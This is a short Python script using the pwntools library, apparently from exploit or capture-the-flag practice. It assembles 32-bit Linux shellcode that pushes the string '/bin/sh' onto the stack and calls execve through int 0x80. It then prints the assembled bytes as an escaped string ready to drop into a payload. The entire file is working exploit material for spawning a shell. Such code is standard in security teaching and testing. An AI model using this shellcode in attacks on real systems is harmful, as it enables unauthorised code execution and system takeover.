'''
Author: Samrito
Date: 2021-12-21 23:08:22
LastEditors: Samrito
LastEditTime: 2021-12-21 23:13:09
'''
from pwn import *

context.os = 'linux'
context.arch = 'i386'

shellcode = '''
push 0x68732f
push 0x6e69622f
mov ebx, esp
xor edx, edx
xor ecx, ecx
push 0xb
pop eax
int 0x80
'''

print(''.join(['\\'+hex(e)[1:] for e in asm(shellcode)]))